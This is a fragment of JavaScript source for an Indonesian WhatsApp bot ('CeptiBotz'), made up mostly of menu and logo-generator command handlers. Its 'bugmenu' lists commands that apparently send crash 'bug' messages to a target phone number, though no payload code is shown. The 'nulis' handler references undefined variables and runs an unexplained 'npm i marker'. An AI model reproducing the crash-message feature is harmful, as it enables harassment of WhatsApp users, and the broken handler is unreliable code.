│⫹⫺  ${prefix}neondevil
│⫹⫺  ${prefix}underwater
│⫹⫺  ${prefix}graffitibike
│⫹⫺  ${prefix}snow
│⫹⫺  ${prefix}cloud
│⫹⫺  ${prefix}honey
│⫹⫺  ${prefix}ice
│⫹⫺  ${prefix}fruitjuice
│⫹⫺  ${prefix}biscuit
│⫹⫺  ${prefix}wood
│⫹⫺  ${prefix}chocolate
│⫹⫺  ${prefix}strawberry
│⫹⫺  ${prefix}matrix
│⫹⫺  ${prefix}blood
│⫹⫺  ${prefix}toxic
│⫹⫺  ${prefix}lava
│⫹⫺  ${prefix}rock
│⫹⫺  ${prefix}bloodglas
│⫹⫺  ${prefix}hallowen
│⫹⫺  ${prefix}darkgold
│⫹⫺  ${prefix}wicker
│⫹⫺  ${prefix}firework
│⫹⫺  ${prefix}skeleton
│⫹⫺  ${prefix}blackpink
│⫹⫺  ${prefix}sand
│⫹⫺  ${prefix}glue
│⫹⫺  ${prefix}1917
│⫹⫺  ${prefix}leaves
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'newsmenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *NEWS MENU*
│⫹⫺  ${prefix}jalantikus-meme
│⫹⫺  ${prefix}merdeka-news
│⫹⫺  ${prefix}kontan-news
│⫹⫺  ${prefix}cnbc-news
│⫹⫺  ${prefix}tribun-news
│⫹⫺  ${prefix}indozone-news
│⫹⫺  ${prefix}kompas-news
│⫹⫺  ${prefix}detik-news
│⫹⫺  ${prefix}daily-news
│⫹⫺  ${prefix}inews-news
│⫹⫺  ${prefix}okezone-news
│⫹⫺  ${prefix}sindo-news
│⫹⫺  ${prefix}tempo-news
│⫹⫺  ${prefix}antara-news
│⫹⫺  ${prefix}cnn-news
│⫹⫺  ${prefix}fajar-news
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'bugmenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *BUG MENU*
│⫹⫺  ${prefix}jagoan send nomor
│⫹⫺   ${prefix}docgas send nomor
│⫹⫺   ${prefix}cepstick send target
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'stikermenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *STIKER MENU*
│⫹⫺  ${prefix}stickerwm [Teks1|Teks2]
│⫹⫺  ${prefix}sticker
│⫹⫺  ${prefix}gura
│⫹⫺  ${prefix}patrik
│⫹⫺  ${prefix}stikeranime
│⫹⫺  ${prefix}doge
│⫹⫺  ${prefix}bucinstick
│⫹⫺  ${prefix}semoji
│⫹⫺  ${prefix}emojimix
│⫹⫺  ${prefix}smeme
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'ownermenu':
   if (!isOwner) return reply(mess.owner)

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *OWNER MENU*
│⫹⫺  ${prefix}sendsessi
│⫹⫺  ${prefix}chat [option]
│⫹⫺  ${prefix}join [link]
│⫹⫺  ${prefix}leave
│⫹⫺  ${prefix}block @user
│⫹⫺  ${prefix}unblock @user
│⫹⫺  ${prefix}bcgroup [text]
│⫹⫺  ${prefix}bcall [text]
│⫹⫺  ${prefix}setppbot [image]
│⫹⫺  ${prefix}setbio [text]
│⫹⫺  ${prefix}listpc
│⫹⫺  ${prefix}listgc
│⫹⫺  ${prefix}addprem
│⫹⫺  ${prefix}dellprem
│⫹⫺  ${prefix}ban
│⫹⫺  ${prefix}unban
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'voicemenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *VOICE CHANGER MENU*
│⫹⫺  ${prefix}bass
│⫹⫺  ${prefix}blown
│⫹⫺  ${prefix}deep
│⫹⫺  ${prefix}earrape
│⫹⫺  ${prefix}fast
│⫹⫺  ${prefix}fat
│⫹⫺  ${prefix}nightcore
│⫹⫺  ${prefix}reverse
│⫹⫺  ${prefix}robot
│⫹⫺  ${prefix}slow
│⫹⫺  ${prefix}tupai
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'asumenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *ASUPAN MENU*
│⫹⫺  ${prefix}asupan
│⫹⫺  ${prefix}asupanghea
│⫹⫺  ${prefix}asupanbocil
│⫹⫺  ${prefix}asupanukhty
│⫹⫺  ${prefix}asupansantuy
│⫹⫺  ${prefix}asupankayes
│⫹⫺  ${prefix}asupanrika
│⫹⫺  ${prefix}asupannotnot
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'islammenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *ISLAM MENU*
│⫹⫺  ${prefix}iqra
│⫹⫺  ${prefix}hadist
│⫹⫺  ${prefix}alquran
│⫹⫺  ${prefix}juzamma
│⫹⫺  ${prefix}asmaulhusna
│⫹⫺  ${prefix}jadwalsholat
│⫹⫺  ${prefix}kisahnabi
│⫹⫺  ${prefix}ceramah
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'allmenu':

    if (isBan) return reply(mess.banned)
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: listmn,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'othermenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *OTHER MENU*
│⫹⫺  ${prefix}fliptext
│⫹⫺  ${prefix}toletter
│⫹⫺  ${prefix}del
│⫹⫺  ${prefix}image
│⫹⫺  ${prefix}kalkulator
│⫹⫺  ${prefix}ping
│⫹⫺  ${prefix}owner
│⫹⫺  ${prefix}delete
│⫹⫺  ${prefix}infochat
│⫹⫺  ${prefix}quoted
│⫹⫺  ${prefix}setcmd
│⫹⫺  ${prefix}listcmd
│⫹⫺  ${prefix}delcmd
│⫹⫺  ${prefix}lockcmd
│⫹⫺  ${prefix}addmsg
│⫹⫺  ${prefix}listmsg
│⫹⫺  ${prefix}getmsg
│⫹⫺  ${prefix}delmsg
│⫹⫺  ${prefix}servermc
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'gamemenu':{
  // send a list message!
   const sections = [
    {
	title: "Game 1",
	rows: [
	   {
	    title: "Tebak Gambar", 
	    rowId: `${prefix}tebakgambar`,
	   },	    
     ]
    },
    {
	title: "Game 2",
	rows: [
	   {
	    title: "Tebak Lirik", 
	    rowId: `${prefix}tebak lirik`,
	   },	    
     ]
    },
    {
	title: "Game 3",
	rows: [
	   {
	    title: "tictactoe", 
	    rowId: `${prefix}tictactoe`,
	   },	    
     ]
    },
    {
	title: "Game 4",
	rows: [
	   {
	    title: "Tebak Kata", 
	    rowId: `${prefix}tebak kata`,
	   },	    
     ]
    },
    {
	title: "Game 5",
	rows: [
	   {
	    title: "Tebak Lontong", 
	    rowId: `${prefix}tebak lontong`,
	   },	    
     ]
    },
    {
	title: "Game 6",
	rows: [
	   {
	    title: "Tebak Lagu", 
	    rowId: `${prefix}tebak lagu`,
      },	    
     ]
    },
    {
	title: "Game 7",
	rows: [
	   {
	    title: "Tebak Kalimat", 
	    rowId: `${prefix}tebak kalimat`,
      },	    
     ]
    },
    {
	title: "Game 8",
	rows: [
	   {
	    title: "Suit PvP", 
	    rowId: `${prefix}suitpvp`,
	    description: "",
	   },	    
     ]
    }     
    ]

  const listMessage = {
   text: `*_Hai kak ${pushname} ${ucapanWaktu}_*\n\n_Berikut Game" Yang Tersedia Di Ceptibotz‡_`,
   footer: "CEPTIBOTZ‡",
   title: "",
   buttonText: "Buka!",
   sections
   }

  Cepti.sendMessage(m.chat, listMessage, {quoted:m})


  }
break
case 'convertmenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *CONVERTER MENU*
│⫹⫺  ${prefix}toimage
│⫹⫺  ${prefix}removebg
│⫹⫺  ${prefix}sticker
│⫹⫺  ${prefix}emojimix
│⫹⫺  ${prefix}tovideo
│⫹⫺  ${prefix}togif
│⫹⫺  ${prefix}tourl
│⫹⫺  ${prefix}tovn
│⫹⫺  ${prefix}tomp3
│⫹⫺  ${prefix}toaudio
│⫹⫺  ${prefix}ebinary
│⫹⫺  ${prefix}dbinary
│⫹⫺  ${prefix}styletext
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'primbonmenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *PRIMBON MENU*
│⫹⫺  ${prefix}nomorhoki
│⫹⫺  ${prefix}artimimpi
│⫹⫺  ${prefix}artinama
│⫹⫺  ${prefix}ramaljodoh
│⫹⫺  ${prefix}ramaljodohbali
│⫹⫺  ${prefix}suamiistri
│⫹⫺  ${prefix}ramalcinta
│⫹⫺  ${prefix}cocoknama
│⫹⫺  ${prefix}pasangan
│⫹⫺  ${prefix}jadiannikah
│⫹⫺  ${prefix}sifatusaha
│⫹⫺  ${prefix}rezeki
│⫹⫺  ${prefix}pekerjaan
│⫹⫺  ${prefix}nasib
│⫹⫺  ${prefix}penyakit
│⫹⫺  ${prefix}tarot
│⫹⫺  ${prefix}fengshui
│⫹⫺  ${prefix}haribaik
│⫹⫺  ${prefix}harisangar
│⫹⫺  ${prefix}harisial
│⫹⫺  ${prefix}nagahari
│⫹⫺  ${prefix}arahrezeki
│⫹⫺  ${prefix}peruntungan
│⫹⫺  ${prefix}weton
│⫹⫺  ${prefix}karakter
│⫹⫺  ${prefix}keberuntungan
│⫹⫺  ${prefix}memancing
│⫹⫺  ${prefix}masasubur
│⫹⫺  ${prefix}zodiak
│⫹⫺  ${prefix}shio
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'funmenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *FUN MENU*
│⫹⫺  ${prefix}fakemore
│⫹⫺  ${prefix}quotes
│⫹⫺  ${prefix}halah
│⫹⫺  ${prefix}hilih
│⫹⫺  ${prefix}huluh
│⫹⫺  ${prefix}heleh
│⫹⫺  ${prefix}holoh
│⫹⫺  ${prefix}jadian
│⫹⫺  ${prefix}jodohku
│⫹⫺  ${prefix}delttt
│⫹⫺  ${prefix}tictactoe
│⫹⫺  ${prefix}family100
│⫹⫺  ${prefix}tebak [option]
│⫹⫺  ${prefix}math [mode]
│⫹⫺  ${prefix}suitpvp [@tag]
│⫹⫺  ${prefix}react [Emoji]
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'searchmenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *SEARCH MENU*
│⫹⫺  ${prefix}searchgc [query]
│⫹⫺  ${prefix}play [query]
│⫹⫺  ${prefix}yts [query]
│⫹⫺  ${prefix}google [query]
│⫹⫺  ${prefix}gimage [query]
│⫹⫺  ${prefix}pinterest [query]
│⫹⫺  ${prefix}wallpaper [query]
│⫹⫺  ${prefix}wikimedia [query]
│⫹⫺  ${prefix}ytsearch [query]
│⫹⫺  ${prefix}ringtone [query]
│⫹⫺  ${prefix}pinterest2 [query]
│⫹⫺  ${prefix}mcpedl [query]
│⫹⫺  ${prefix}brainly [query]
│⫹⫺  ${prefix}happymod [query]
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'downloadmenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *DOWNLOADER MENU*
│⫹⫺  ${prefix}ytmp3 [url]
│⫹⫺  ${prefix}ytmp4 [url]
│⫹⫺  ${prefix}twitter [url]
│⫹⫺  ${prefix}umma [url]
│⫹⫺  ${prefix}mediafire [url]
│⫹⫺  ${prefix}zippyshare [url]
│⫹⫺  ${prefix}gitclone [url]
│⫹⫺  ${prefix}facebook [url]
│⫹⫺  ${prefix}tiktok [url]
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'groupmenu':

    if (isBan) return reply(mess.banned)
 menu = `


╭──❍ *GROUP MENU*
│⫹⫺  ${prefix}getpp [tag]
│⫹⫺  ${prefix}afk [Alasan]
│⫹⫺  ${prefix}linkgroup
│⫹⫺  ${prefix}ephemeral [option]
│⫹⫺  ${prefix}setppgc [image]
│⫹⫺  ${prefix}setname [text]
│⫹⫺  ${prefix}setdesc [text]
│⫹⫺  ${prefix}group [option]
│⫹⫺  ${prefix}editinfo [option]
│⫹⫺  ${prefix}add @user
│⫹⫺  ${prefix}kick @user
│⫹⫺  ${prefix}hidetag [text]
│⫹⫺  ${prefix}tagall [text]
│⫹⫺  ${prefix}promote @user
│⫹⫺  ${prefix}demote @user
│⫹⫺  ${prefix}vote [text]
│⫹⫺  ${prefix}devote
│⫹⫺  ${prefix}upvote
│⫹⫺  ${prefix}cekvote
│⫹⫺  ${prefix}hapusvote
│⫹⫺  ${prefix}antilink
│⫹⫺  ${prefix}welcome
│⫹⫺  ${prefix}listonline
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'mainmenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *MAIN COMMAND*
│⫹⫺  ${prefix}limit
│⫹⫺  ${prefix}atm
│⫹⫺  ${prefix}owner
│⫹⫺  ${prefix}menu
│⫹⫺  ${prefix}daftar
│⫹⫺  ${prefix}buylimit
╰────❍
`
    const buttonss1 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
const pa2 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss1,
headerType: 1
}
Cepti.sendMessage(from, pa2, {quoted:m})
break
case 'msg':
 if (isBan) return reply(mess.banned)
if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
 if (args.length < 1) return reply(`Penggunaan ${prefix + command} 088293100977|Hallo`)
nom = q.split("|")[0]
nom2 = q.split("|")[1]
let kontoru =`${nom}@s.whatsapp.net`
  Cepti.sendMessage(kontoru, {text:nom2}, {quoted:ftex})
break
case 'nulis': {
if (!isRegister) return reply(blomList) & sendButMessage(sender,list1,list2,list3, { quoted: m})
    if (isBan) return reply(mess.banned)
if (args.length < 1) return reply(`Example :\n${prefix}nulis Nama |kelas|black|saya ini anak yg rajin yg mau menulis sendiri`)
if (checklimitUser(sender) <= 0) return reply(limitabis)  
const nls = args.join(" ")
const nams = "Nama : " + nls.split("|")[0];
const kels = "Kelas : " + nls.split("|")[1];
const menlise = nls.split("|")[3];
const codewarn = nls.split("|")[2];
await reply('Sedang menulis')
const jangkale = menlise.replace(/(\S+\s*){1,10}/g, '$&\n')
const jangbare = jangkale.split('\n').slice(0, 30).join('\n')
const jangnam = nams.replace(/(\S+\s*){1,10}/g, '$&\n')
const jangkel = kels.replace(/(\S+\s*){1,10}/g, '$&\n')
if (kels.length > 12) return reply("Jumlah teks kelas maximal 4")
if (nams.length > 34) return reply("Jumlah teks nama maximal 27")
if (codewarn.length > 7) return reply("Jumlah teks warna maximal 7")
console.log('「 MENULIS 」Sedang dalam prosses')
spawn('convert', [
'./cepti/magernulis.jpg',
'-fill',
codewarn,
'-font',
'./src/font/nulis.ttf',
'-size',
'1024x784',
'-pointsize',
'20',
'-interline-spacing',
'1',
'-annotate',
'+806+78',
janghar,
'-size',
'1024x784',
'-pointsize',
'18',
'-interline-spacing',
'1',
'-annotate',
'+806+102',
jangwak,
'-size',
'1024x784',
'-pointsize',
'21',
'-interline-spacing',
'1',
'-annotate',
'+285+90',
jangnam,
'-size',
'1024x784',
'-pointsize',
'21',
'-interline-spacing',
'1',
'-annotate',
'+285+110',
jangkel,
'-size',
'1024x784',
'-pointsize',
'20',
'-interline-spacing',
'-7.5',
'-annotate',
'+344+146',
jangbare,
'./src/hasilnulis.jpg'
])
.on('error', () => reply('Error') )
.on('exit', () => {
Cepti.sendMessage(from, {image:fs.readFileSync('./src/hasilnulis.jpg'), caption:'Succes'}, {quoted:m}).catch(() => reply('```「 GAGAL 」Terjadi kesalahan dalam mengirim file```'))
confirmlimit(sender, 1)
})
exec(`npm i marker`)
}
break
//TEXTPRO
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': {
if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
 reply(mess.wait)
 let link
 if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
 if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
 if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
 if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
 if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
 if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
 if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
 if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
 if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
 if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
 if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
 if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
 if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
 if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
 if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
 if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
 if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
 if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
 if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
 if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
 if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
 if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
 if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
 if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
 if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
 if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
 if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
 if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
 if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
 if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
 if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
 if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
 if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
 if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
 if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
 if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
 if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
 if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
 if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
 if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
 if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
 if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
 if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
 if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
 if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
 if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
 if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
 if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
 if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
 if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
 if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
 if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
 if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
 if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
 if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
 if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
 let anu = await maker.textpro(link, q)
Cepti.sendMessage(m.chat, { image: { url: anu }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m })
 }
break
case '3dbox':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
.catch((err) => console.log(err));
break
case 'drapwater':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
`${q}`,])
    .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
    .catch((err) => console.log(err));
break
case 'lion2':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
  if(!q) return reply(`Penggunaan ${prefix + command} teks`)
  reply(mess.wait)
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
 `${q}`,])
.then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
.catch((err) => console.log(err));

break
case 'papercut':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
 if(!q) return reply(`Penggunaan ${prefix + command} teks`)
 reply(mess.wait)
 maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
 .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
 .catch((err) => console.log(err));
 
break
case 'transformer':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
 if(!q) return reply(`Penggunaan ${prefix + command} teks`)
 reply(mess.wait)
 maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
.catch((err) => console.log(err));

break
case 'herryp':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
  if(!q) return reply(`Penggunaan ${prefix + command} teks|teks`)
  reply(mess.wait)
  teks1 = q.split("|")[0]
  teks2 = q.split("|")[1]
  maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
 .catch((err) => console.log(err));
 
break
case 'neondevil':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
 if(!q) return reply(`Penggunaan ${prefix + command} teks`)
 reply(mess.wait)
 maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
